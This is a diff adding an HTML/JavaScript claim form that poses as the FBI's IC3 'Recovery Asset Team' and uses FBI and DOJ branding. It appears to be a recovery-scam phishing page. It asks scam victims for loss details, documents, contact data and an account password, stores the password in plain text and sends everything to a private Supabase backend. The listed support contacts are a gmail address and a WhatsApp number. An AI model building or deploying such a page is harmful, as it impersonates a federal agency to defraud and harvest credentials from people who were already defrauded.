+        <label class="option-card">
+          <input type="radio" name="lossAmount" value="$100,000 - $500,000">
+          <span class="option-label">
+            $100,000 – $500,000
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="lossAmount" value="$500,000+">
+          <span class="option-label">
+            $500,000+
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="lossAmount" value="Prefer not to say">
+          <span class="option-label">
+            Prefer not to say
+            <span class="option-check"></span>
+          </span>
+        </label>
+      </div>
+
+      <div class="nav-row">
+        <button class="btn-back" onclick="goBack(2)">← Back</button>
+        <button class="btn-next" onclick="goNext(2)">Continue →</button>
+      </div>
+    </div>
+
+    <!-- ═══════════ STEP 3 ═══════════ -->
+    <div class="step-card step-view" id="step3">
+      <div class="step-label">Step 3 of 5</div>
+      <h2 class="step-title">When did this happen?</h2>
+      <p class="step-instruction">Select the timeframe.</p>
+
+      <div class="options-grid single-col" id="step3Options">
+        <label class="option-card">
+          <input type="radio" name="timeframe" value="Less than 3 months ago">
+          <span class="option-label">
+            Less than 3 months ago
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="timeframe" value="3 - 6 months ago">
+          <span class="option-label">
+            3 – 6 months ago
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="timeframe" value="6 - 12 months ago">
+          <span class="option-label">
+            6 – 12 months ago
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="timeframe" value="1 - 2 years ago">
+          <span class="option-label">
+            1 – 2 years ago
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="timeframe" value="2+ years ago">
+          <span class="option-label">
+            2+ years ago
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="timeframe" value="Ongoing">
+          <span class="option-label">
+            Ongoing
+            <span class="option-check"></span>
+          </span>
+        </label>
+      </div>
+
+      <div class="nav-row">
+        <button class="btn-back" onclick="goBack(3)">← Back</button>
+        <button class="btn-next" onclick="goNext(3)">Continue →</button>
+      </div>
+    </div>
+
+    <!-- ═══════════ STEP 4 ═══════════ -->
+    <div class="step-card step-view" id="step4">
+      <div class="step-label">Step 4 of 5</div>
+      <h2 class="step-title">Tell us more about your case</h2>
+      <p class="step-instruction">Provide details and any supporting evidence.</p>
+
+      <div class="field-block" id="fb-description">
+        <label for="caseDescription">Describe what happened</label>
+        <textarea
+          id="caseDescription"
+          name="incidentDescription"
+          rows="5"
+          placeholder="Include details such as the company/individual involved, how you were contacted, what happened, and any actions you've already taken..."
+        ></textarea>
+        <div class="field-error">Please describe what happened.</div>
+      </div>
+
+      <div class="field-block">
+        <label>Supporting documents <span style="font-weight:400;text-transform:none;font-size:0.8rem;color:var(--muted);">(optional)</span></label>
+        <div class="field-note">
+          Screenshots, bank statements, contracts, emails — up to 10MB each.
+        </div>
+        <div class="upload-zone" id="uploadZone" onclick="document.getElementById('fileInput').click()">
+          <div class="upload-text"><span>Click to upload</span> or drag files here</div>
+          <div class="upload-sub">JPG, PNG, PDF, DOC, XLS, TXT · Max 10MB each</div>
+          <input
+            type="file"
+            id="fileInput"
+            class="upload-input"
+            accept=".jpg,.jpeg,.png,.pdf,.doc,.docx,.xls,.xlsx,.txt"
+            multiple
+          >
+        </div>
+        <div class="uploaded-files" id="uploadedFiles"></div>
+      </div>
+
+      <div class="nav-row">
+        <button class="btn-back" onclick="goBack(4)">← Back</button>
+        <button class="btn-next" onclick="goNext(4)">Continue →</button>
+      </div>
+    </div>
+
+    <!-- ═══════════ STEP 5 ═══════════ -->
+    <div class="step-card step-view" id="step5">
+      <div class="step-label">Step 5 of 5</div>
+      <h2 class="step-title">Create your account</h2>
+      <p class="step-instruction">Set up your account to track your case and receive updates.</p>
+
+      <div class="form-two-col">
+        <div class="field-block" id="fb-fullName">
+          <label for="fullName">Full Name</label>
+          <input type="text" id="fullName" name="complainantName" placeholder="Your full name" autocomplete="name">
+          <div class="field-error">Full name is required.</div>
+        </div>
+        <div class="field-block" id="fb-email">
+          <label for="emailAddr">Email</label>
+          <input type="email" id="emailAddr" name="compEmail" placeholder="your@email.com" autocomplete="email">
+          <div class="field-error">A valid email is required.</div>
+        </div>
+      </div>
+
+      <div class="form-two-col">
+        <div class="field-block" id="fb-phone">
+          <label for="phoneNum">Phone</label>
+          <input type="tel" id="phoneNum" name="compPhone" placeholder="Your phone number" autocomplete="tel">
+          <div class="field-error">Phone number is required.</div>
+        </div>
+        <div class="field-block" id="fb-country">
+          <label for="countrySelect">Country</label>
+          <select id="countrySelect" name="country">
+            <option value="" disabled selected>Select your country</option>
+            <option>United States</option>
+            <option>Canada</option>
+            <option>United Kingdom</option>
+            <option>Australia</option>
+            <option>New Zealand</option>
+            <option>Ireland</option>
+            <option>Germany</option>
+            <option>France</option>
+            <option>Netherlands</option>
+            <option>Switzerland</option>
+            <option>Sweden</option>
+            <option>Norway</option>
+            <option>Denmark</option>
+            <option>Finland</option>
+            <option>Belgium</option>
+            <option>Austria</option>
+            <option>Spain</option>
+            <option>Italy</option>
+            <option>Portugal</option>
+            <option>Singapore</option>
+            <option>Japan</option>
+            <option>South Korea</option>
+            <option>UAE</option>
+            <option>South Africa</option>
+            <option>India</option>
+            <option>Brazil</option>
+            <option>Mexico</option>
+            <option>Israel</option>
+            <option>Other</option>
+          </select>
+          <div class="field-error">Please select your country.</div>
+        </div>
+      </div>
+
+      <div class="form-two-col">
+        <div class="field-block" id="fb-password">
+          <label for="pwField">Password</label>
+          <input type="password" id="pwField" name="password" placeholder="Min. 8 characters" autocomplete="new-password" oninput="checkPwStrength(this.value)">
+          <div class="pw-strength-bar">
+            <div class="pw-seg" id="ps1"></div>
+            <div class="pw-seg" id="ps2"></div>
+            <div class="pw-seg" id="ps3"></div>
+            <div class="pw-seg" id="ps4"></div>
+          </div>
+          <div class="pw-hint" id="pwHint">Enter a password</div>
+          <div class="field-error">Password must be at least 8 characters.</div>
+        </div>
+        <div class="field-block" id="fb-confirmPw">
+          <label for="confirmPw">Confirm Password</label>
+          <input type="password" id="confirmPw" name="confirmPassword" placeholder="Confirm password" autocomplete="new-password">
+          <div class="field-error">Passwords do not match.</div>
+        </div>
+      </div>
+
+      <div class="nav-row">
+        <button class="btn-back" onclick="goBack(5)">← Back</button>
+        <button class="btn-next btn-submit" onclick="submitClaim()">Submit Claim &amp; Create Account</button>
+      </div>
+
+      <p class="form-footer-text">
+        By submitting, you agree to our
+        <a href="../Home/Privacy.html">Terms &amp; Conditions</a> and
+        <a href="../Home/Privacy.html">Privacy Policy</a>.
+      </p>
+      <p class="sign-in-link">
+        Already have an account? <a href="../dashboard.html">Sign in first</a>
+      </p>
+    </div>
+
+    <!-- ═══════════ SUCCESS ═══════════ -->
+    <div class="step-card step-view" id="stepSuccess">
+      <div class="success-card">
+        <h2 class="success-title">Claim Submitted!</h2>
+        <p class="success-sub">
+          Your claim has been received and registered with the IC3 Recovery Asset Team.
+          A specialist will review your case and contact you within 24–48 hours.
+        </p>
+        <div class="tracking-chip" id="successTrackId">IC-2026-——</div>
+        <div class="success-actions">
+          <a href="../dashboard.html" class="btn-next" style="flex:none;padding:0.75rem 1.5rem;font-size:0.9rem;text-decoration:none;">View My Dashboard →</a>
+          <a href="../index.html" class="btn-back" style="text-decoration:none;">Return to IC3 Home</a>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /claim-box -->
+</div><!-- /claim-wrapper -->
+
+<!-- ── FOOTER ── -->
+<footer class="site-footer">
+  <div class="site-footer-inner">
+    <div>
+      <div class="footer-col-title">IC3</div>
+      <ul class="footer-links">
+        <li><a href="../index.html">Home Page</a></li>
+        <li><a href="../Home/Privacy.html">Privacy Policy</a></li>
+        <li><a href="../Home/About.html">About IC3</a></li>
+      </ul>
+    </div>
+    <div>
+      <div class="footer-col-title">FBI</div>
+      <ul class="footer-links">
+        <li><a href="../index.html">Home Page</a></li>
+        <li><a href="../Home/Privacy.html">Privacy Policy</a></li>
+        <li><a href="../Home/About.html">About FBI</a></li>
+      </ul>
+    </div>
+    <div>
+      <div class="footer-col-title">DOJ</div>
+      <ul class="footer-links">
+        <li><a href="../index.html">Home Page</a></li>
+        <li><a href="../Home/Privacy.html">Privacy Policy</a></li>
+        <li><a href="../Home/About.html">About DOJ</a></li>
+      </ul>
+    </div>
+    <div>
+      <div class="footer-col-title">Contact RAT Support</div>
+      <ul class="footer-links">
+        <li><a href="mailto:support.ic3rat@gmail.com">support.ic3rat@gmail.com</a></li>
+        <li><a href="https://wa.me/14783099781">+1 (478) 309-9781</a></li>
+        <li><a href="../Home/FAQ.html">See the IC3 FAQ</a></li>
+      </ul>
+    </div>
+  </div>
+</footer>
+
+<script src="../js/supabase-config.js"></script>
+<script src="../js/complaint-backend.js"></script>
+<script>
+(function () {
+  var currentStep = 1;
+  var totalSteps  = 5;
+  var uploadedFilesList = [];
+
+  var STEP_PCT = { 1: 20, 2: 40, 3: 60, 4: 80, 5: 100 };
+
+  function updateProgress(step) {
+    var pct = STEP_PCT[step] || 100;
+    document.getElementById('progressFill').style.width = pct + '%';
+    document.getElementById('progressPct').textContent  = pct + '%';
+    document.getElementById('progressLabel').textContent = 'Step ' + step + ' of ' + totalSteps;
+  }
+
+  function showStep(n) {
+    document.querySelectorAll('.step-view').forEach(function(el) { el.classList.remove('active'); });
+    var el = document.getElementById('step' + n);
+    if (el) { el.classList.add('active'); }
+    currentStep = n;
+    updateProgress(n);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+
+    var isSuccess = (n === 'Success');
+    document.getElementById('progressWrap').style.display  = isSuccess ? 'none' : '';
+    document.getElementById('globalHeader').style.display  = isSuccess ? 'none' : '';
+  }
+
+  function getRadioVal(name) {
+    var checked = document.querySelector('input[name="' + name + '"]:checked');
+    return checked ? checked.value : '';
+  }
+
+  function setError(blockId, hasError) {
+    var el = document.getElementById(blockId);
+    if (!el) return;
+    if (hasError) el.classList.add('has-error');
+    else el.classList.remove('has-error');
+  }
+
+  function validateStep(step) {
+    if (step === 1) {
+      if (!getRadioVal('scamType')) {
+        alert('Please select what happened to you.');
+        return false;
+      }
+    }
+    if (step === 2) {
+      if (!getRadioVal('lossAmount')) {
+        alert('Please select the approximate amount lost.');
+        return false;
+      }
+    }
+    if (step === 3) {
+      if (!getRadioVal('timeframe')) {
+        alert('Please select a timeframe.');
+        return false;
+      }
+    }
+    if (step === 4) {
+      var desc = document.getElementById('caseDescription').value.trim();
+      setError('fb-description', !desc);
+      if (!desc) {
+        document.getElementById('caseDescription').focus();
+        return false;
+      }
+    }
+    if (step === 5) {
+      var ok = true;
+      var name = document.getElementById('fullName').value.trim();
+      var email = document.getElementById('emailAddr').value.trim();
+      var phone = document.getElementById('phoneNum').value.trim();
+      var country = document.getElementById('countrySelect').value;
+      var pw = document.getElementById('pwField').value;
+      var pwc = document.getElementById('confirmPw').value;
+
+      setError('fb-fullName', !name);
+      if (!name) ok = false;
+
+      var emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+      setError('fb-email', !emailOk);
+      if (!emailOk) ok = false;
+
+      setError('fb-phone', !phone);
+      if (!phone) ok = false;
+
+      setError('fb-country', !country);
+      if (!country) ok = false;
+
+      setError('fb-password', pw.length < 8);
+      if (pw.length < 8) ok = false;
+
+      setError('fb-confirmPw', pw !== pwc);
+      if (pw !== pwc) ok = false;
+
+      return ok;
+    }
+    return true;
+  }
+
+  window.goNext = function(step) {
+    if (!validateStep(step)) return;
+    saveStep(step);
+    showStep(step + 1);
+  };
+
+  window.goBack = function(step) {
+    if (step > 1) showStep(step - 1);
+  };
+
+  function saveStep(step) {
+    if (step === 1) sessionStorage.setItem('scamType', getRadioVal('scamType'));
+    if (step === 2) sessionStorage.setItem('lossAmount', getRadioVal('lossAmount'));
+    if (step === 3) sessionStorage.setItem('timeframe', getRadioVal('timeframe'));
+    if (step === 4) sessionStorage.setItem('incidentDescription', document.getElementById('caseDescription').value.trim());
+    if (step === 5) {
+      sessionStorage.setItem('complainantName', document.getElementById('fullName').value.trim());
+      sessionStorage.setItem('compEmail', document.getElementById('emailAddr').value.trim());
+      sessionStorage.setItem('compPhone', document.getElementById('phoneNum').value.trim());
+      sessionStorage.setItem('country', document.getElementById('countrySelect').value);
+    }
+  }
+
+  window.submitClaim = async function() {
+    if (!validateStep(5)) return;
+    saveStep(5);
+
+    var trackId = 'IC-' + new Date().getFullYear() + '-' + Math.floor(10000000 + Math.random() * 89999999);
+    sessionStorage.setItem('complaintReference', trackId);
+    sessionStorage.setItem('complaintSubmittedAt', new Date().toISOString());
+
+    try {
+      var password = document.getElementById('pwField').value || '';
+      var matterId = 'REC-' + trackId.replace('IC-','').replace(/\d{4}-/,'');
+      var data = {
+        name: sessionStorage.getItem('complainantName'),
+        email: sessionStorage.getItem('compEmail'),
+        phone: sessionStorage.getItem('compPhone'),
+        country: sessionStorage.getItem('country'),
+        txType: sessionStorage.getItem('scamType'),
+        moneyLost: sessionStorage.getItem('lossAmount'),
+        timeframe: sessionStorage.getItem('timeframe'),
+        description: sessionStorage.getItem('incidentDescription'),
+        trackingId: trackId,
+        matterId: matterId,
+        password: password,
+        submittedAt: new Date().toISOString(),
+      };
+      localStorage.setItem('ic3_tracking_id', trackId);
+      localStorage.setItem('ic3_matter_id', matterId);
+      localStorage.setItem('ic3_submitted_at', data.submittedAt);
+      localStorage.setItem('ic3_complaint_data', JSON.stringify(data));
+      var cases = [{
+        id: matterId, name: data.name, filed: new Date().toLocaleString('en-US',{dateStyle:'medium',timeStyle:'short'}),
+        txType: data.txType || 'Claim', loss: data.moneyLost || '—', status: 'new', data: data
+      }];
+      localStorage.setItem('ic3_all_cases', JSON.stringify(cases));
+
+      // Save to users database index
+      var db = JSON.parse(localStorage.getItem('ic3_users_db') || '{}');
+      var userRecord = {
+        name: data.name,
+        email: data.email,
+        phone: data.phone,
+        country: data.country,
+        password: password,
+        trackingId: trackId,
+        matterId: matterId,
+        scamType: data.txType,
+        lossAmount: data.moneyLost,
+        timeframe: data.timeframe,
+        description: data.description,
+        submittedAt: data.submittedAt,
+        cases: cases
+      };
+      if (data.email) db[data.email.toLowerCase()] = userRecord;
+      if (trackId) db[trackId.toLowerCase()] = userRecord;
+      if (matterId) db[matterId.toLowerCase()] = userRecord;
+      localStorage.setItem('ic3_users_db', JSON.stringify(db));
+      if (data.email) localStorage.setItem('ic3_current_user', data.email.toLowerCase());
+    } catch(e) {}
+
+    try {
+      if (!window.ComplaintBackend || !window.ComplaintBackend.submitComplaint) throw new Error('Complaint service unavailable.');
+      var saved = await window.ComplaintBackend.submitComplaint(userRecord);
+      if (!saved) throw new Error('Complaint was not accepted by Supabase.');
+    } catch (error) {
+      console.error('[Complaint] Submission failed:', error);
+      alert('We could not save your complaint. Please check your connection and try again.');
+      return;
+    }
+
+    document.getElementById('successTrackId').textContent = trackId;
+    document.querySelectorAll('.step-view').forEach(function(el) { el.classList.remove('active'); });
+    document.getElementById('stepSuccess').classList.add('active');
+    document.getElementById('progressWrap').style.display = 'none';
+    document.getElementById('globalHeader').style.display = 'none';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  };
+
+  window.checkPwStrength = function(val) {
+    var segs = [document.getElementById('ps1'), document.getElementById('ps2'), document.getElementById('ps3'), document.getElementById('ps4')];
+    var hint = document.getElementById('pwHint');
+    segs.forEach(function(s) { s.className = 'pw-seg'; });
+
+    if (!val) { hint.textContent = 'Enter a password'; return; }
+
+    var score = 0;
+    if (val.length >= 8)  score++;
+    if (val.length >= 12) score++;
+    if (/[A-Z]/.test(val) && /[0-9]/.test(val)) score++;
+    if (/[^A-Za-z0-9]/.test(val)) score++;
+
+    var labels = ['Weak', 'Fair', 'Good', 'Strong'];
+    var cls    = ['weak', 'fair', 'strong', 'strong'];
+    hint.textContent = 'Strength: ' + (labels[score - 1] || 'Too short');
+    for (var i = 0; i < score; i++) segs[i].classList.add(cls[score - 1] || 'weak');
+  };
+
+  var uploadZone = document.getElementById('uploadZone');
+  var fileInput  = document.getElementById('fileInput');
+  var uploadedFilesEl = document.getElementById('uploadedFiles');
+
+  fileInput.addEventListener('change', function() { handleFiles(this.files); });
+
+  uploadZone.addEventListener('dragover', function(e) { e.preventDefault(); this.classList.add('drag-over'); });
+  uploadZone.addEventListener('dragleave', function() { this.classList.remove('drag-over'); });
+  uploadZone.addEventListener('drop', function(e) {
+    e.preventDefault(); this.classList.remove('drag-over');
+    handleFiles(e.dataTransfer.files);
+  });
+
+  function handleFiles(files) {
+    Array.from(files).forEach(function(file) {
+      if (file.size > 10 * 1024 * 1024) { alert(file.name + ' exceeds 10MB limit.'); return; }
+      uploadedFilesList.push(file);
+      renderFiles();
+    });
+  }
+
+  function renderFiles() {
+    uploadedFilesEl.innerHTML = uploadedFilesList.map(function(f, i) {
+      return '<div class="uploaded-file">'
+        + '<span class="uploaded-file-name">' + f.name + '</span>'
+        + '<span style="color:var(--muted);font-size:0.72rem;">' + (f.size / 1024).toFixed(0) + ' KB</span>'
+        + '<button class="uploaded-file-remove" onclick="removeFile(' + i + ')" title="Remove">×</button>'
+        + '</div>';
+    }).join('');
+  }
+
+  window.removeFile = function(i) {
+    uploadedFilesList.splice(i, 1);
+    renderFiles();
+  };
+
+  (function restoreAnswers() {
+    var scamType = sessionStorage.getItem('scamType');
+    if (scamType) {
+      var r = document.querySelector('input[name="scamType"][value="' + scamType + '"]');
+      if (r) r.checked = true;
+    }
+    var lossAmount = sessionStorage.getItem('lossAmount');
+    if (lossAmount) {
+      var r2 = document.querySelector('input[name="lossAmount"][value="' + lossAmount + '"]');
+      if (r2) r2.checked = true;
+    }
+    var timeframe = sessionStorage.getItem('timeframe');
+    if (timeframe) {
+      var r3 = document.querySelector('input[name="timeframe"][value="' + timeframe + '"]');
+      if (r3) r3.checked = true;
+    }
+    var desc = sessionStorage.getItem('incidentDescription');
+    if (desc) document.getElementById('caseDescription').value = desc;
+    var name = sessionStorage.getItem('complainantName');
+    if (name) document.getElementById('fullName').value = name;
+    var email = sessionStorage.getItem('compEmail');
+    if (email) document.getElementById('emailAddr').value = email;
+    var phone = sessionStorage.getItem('compPhone');
+    if (phone) document.getElementById('phoneNum').value = phone;
+    var country = sessionStorage.getItem('country');
+    if (country) document.getElementById('countrySelect').value = country;
+  })();
+
+  document.querySelectorAll('.field-block input, .field-block textarea, .field-block select').forEach(function(el) {
+    el.addEventListener('input', function() {
+      var block = el.closest('.field-block');
+      if (block) block.classList.remove('has-error');
+    });
+    el.addEventListener('change', function() {
+      var block = el.closest('.field-block');
+      if (block) block.classList.remove('has-error');
+    });
+  });
+})();
+</script>
+
+<script>
+// Universal Government Banner Accordion Toggle
+(function() {
+  function initGovBannerToggle() {
+    var banner = document.querySelector('.usa-banner');
+    if (!banner) return;
+    var content = banner.querySelector('.usa-banner__content, #gov-banner-default');
+    if (!content) return;
+
+    if (!banner._govInitDone) {
+      banner._govInitDone = true;
+      content.hidden = true;
+      content.style.display = 'none';
+    }
+
+    var toggleBtn = banner.querySelector('.usa-banner__button');
+
+    function toggleBanner(e) {
+      if (e) {
+        if (e.target.closest && e.target.closest('.usa-banner__content')) return;
+        e.preventDefault();
+        e.stopPropagation();
+      }
+      var isHidden = content.hidden || content.style.display === 'none';
+      if (isHidden) {
+        content.hidden = false;
+        content.style.display = 'block';
+        content.style.position = 'relative';
+        content.style.left = 'auto';
+        if (toggleBtn) toggleBtn.setAttribute('aria-expanded', 'true');
+      } else {
+        content.hidden = true;
+        content.style.display = 'none';
+        if (toggleBtn) toggleBtn.setAttribute('aria-expanded', 'false');
+      }
+    }
+
+    var clickableTargets = banner.querySelectorAll('.usa-banner__button, .usa-banner__header-action, .usa-banner__button-text');
+    clickableTargets.forEach(function(el) {
+      el.style.cursor = 'pointer';
+      el.onclick = toggleBanner;
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initGovBannerToggle);
+  } else {
+    initGovBannerToggle();
+  }
+})();
+</script>
+
+    <!-- Terms Modal -->
+    <div class="usa-modal usa-modal--lg" id="fileTerms" aria-labelledby="fileTermsHeading" aria-describedby="fileTermsDesc">
+        <div class="usa-modal__content">
+            <div class="usa-modal__main" id="fileTermsDesc">
+                <div class="usa-alert usa-alert--warning">
+                    <div class="usa-alert__body">
+                        <h4 id="fileTermsHeading" class="usa-alert__heading">Terms and Conditions for RAT Interventions</h4>
+                        <p class="usa-alert__text">
+                            Prior to filing a complaint with the IC3 Recovery Asset Team, please read the following terms regarding emergency wire recalls.
+                        </p>
+                    </div>
+                </div>
+                <div class="font-serif-sm">
+                    <p>Should you have questions prior to filing your complaint, view <a target="_blank" href="../Home/FAQ.html">FAQ</a> for information regarding:</p>
+                    <ul>
+                        <li>What wire transfer details are required for FFKC activation?</li>
+                        <li>How the RAT coordinates with sending &amp; receiving bank AML departments.</li>
+                        <li>How asset restitution and legal forfeiture proceedings are handled.</li>
+                    </ul>
+                    <p>Complaints submitted to IC3 RAT are analyzed in near real-time and referred to FBI Field Offices, USAOs, and bank AML compliance teams.</p>
+                    <p>The information submitted is encrypted via SSL encryption.</p>
+                    <hr class="tablet:margin-left-0">
+                    <p>By clicking "I Accept" you acknowledge that providing false information could make you subject to fine, imprisonment, or both. (<cite>TITLE 18, U.S. CODE, SECTION 1001</cite>)</p>                    
+                </div>
+                <div class="usa-modal__footer">
+                    <ul class="usa-button-group display-flex flex-justify-center">
+                        <li class="usa-button-group__item">
+                            <button id="acceptFile" type="button" class="usa-button" data-close-modal style="background:#d9381e!important;color:#ffffff!important;border:none!important;"Accept & File A Report</button>
+                        </li>
+                        <li class="usa-button-group__item">
+                            <button type="button" class="usa-button usa-button--base" data-close-modal>
+                                Decline
+                            </button>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script async type="module">
+        document.getElementById("acceptFile")?.addEventListener("click", () => { window.location.href = "../complaint.html"; });
+    </script>
+
+</body>
+</html>
